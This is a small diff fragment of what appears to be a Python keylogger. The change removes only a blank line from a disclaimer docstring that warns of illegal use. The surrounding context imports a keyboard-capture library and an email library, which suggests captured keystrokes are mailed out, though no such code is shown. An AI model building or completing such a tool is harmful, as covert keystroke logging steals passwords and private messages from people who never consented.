@@ -4,7 +4,6 @@ If used for malicious hacking activities, it is considered illegal.
 It should only be used for **ethical hacking, testing, and educational purposes**. 
 Running such tools without the explicit consent of the user is strictly prohibited 
 in many countries and can lead to serious legal consequences.
-
 """
 import pynput.keyboard  # For capturing keyboard inputs
 import smtplib  # For sending emails
